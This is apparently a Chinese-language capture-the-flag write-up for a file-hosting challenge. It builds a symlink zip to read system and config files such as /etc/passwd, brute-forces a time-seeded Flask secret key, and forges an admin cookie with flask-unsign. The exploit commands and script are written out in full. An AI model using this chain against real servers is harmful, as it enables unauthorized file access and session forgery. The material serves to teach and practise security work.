# 题目信息

JW#9396

All I wanted was a website letting me host files anonymously for free, for ever

http://simple-file-server.chal.idek.team:1337/

# 解决方案

## 分析

首先阅读源码，发现一个可利用的点，对应如下源码：

```python
subprocess.call(["unzip", filename, "-d", f"{DATA_DIR}uploads/{uuidpath}"])    
```

直接使用unzip解压用户上传的压缩包，这里可以通过软链接来访问任意想要访问的文件，先考虑几个已知的文件，构造对应的压缩包，命令如下：

```sh
ln -s ../../../../../../../../../etc/passwd passwd
ln -s ../../../../../../../../../app/config.py config.py
ln -s ../../../../../../../../../app/flag.txt flag.txt
ln -s ../../../../../../../../../tmp/server.log server.log
zip --symlink exploit.zip passwd config.py flag.txt server.log
```

然后上传，访问这些文件，发现只有flag.txt文件无法访问，因为flag.txt只有root用户可以读取，只能通过cookie认证来获取flag，对应源码如下：

```python
@app.route("/flag")
def flag():
    if not session.get("admin"):
        return "Unauthorized!"
    return subprocess.run("./flag", shell=True, stdout=subprocess.PIPE).stdout.decode("utf-8")
```

我们要伪造cookie前必须知道SECRET_KEY的值，分析产生SECRET_KEY的代码：

```python
import random
import os
import time

SECRET_OFFSET = 0 # REDACTED
random.seed(round((time.time() + SECRET_OFFSET) * 1000))
os.environ["SECRET_KEY"] = "".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", "")
```

由于我们可以读取server.log文件，因此我们知道服务启动的时间，此外我们可以读取config.py文件，获取SECRET_OFFSET的值，然后我们爆破100秒之内的所有时间戳，爆出正确的SECRET_KEY，然后使用正确的SECRET_KEY签一个admin的cookie，就可以访问/flag路径拿到flag。

## 利用

```python
import random
from datetime import datetime, timezone, timedelta

# 2023-01-15 23:05:31 +0000
start = int(datetime(2023, 1, 15, 23, 5, 31, 0, timezone(timedelta(0))).timestamp() - 2)
SECRET_OFFSET = -67198624

secret_list = []
for i in range(100000): # 100s
    random.seed(round((start + SECRET_OFFSET) * 1000) + i)
    secret_list.append("".join([hex(random.randint(0, 15)) for x in range(32)]).replace("0x", ""))

fw = open('secret_list.txt', 'w')
fw.write('\n'.join(secret_list))
```

```sh
flask-unsign --unsign --cookie 'eyJhZG1pbiI6ZmFsc2UsInVpZCI6InlhbmdtaW4ifQ.Y8UfdA.kr27kXrVFCeRW0v_eZbZjkhC_7s' -w secret_list.txt
flask-unsign --sign --cookie "{'admin': True, 'uid': 'yangmin'}" --secret 16522bdca70f4af3b2b03fc988cb1d9a
```

```
idek{s1mpl3_expl01t_s3rver}
```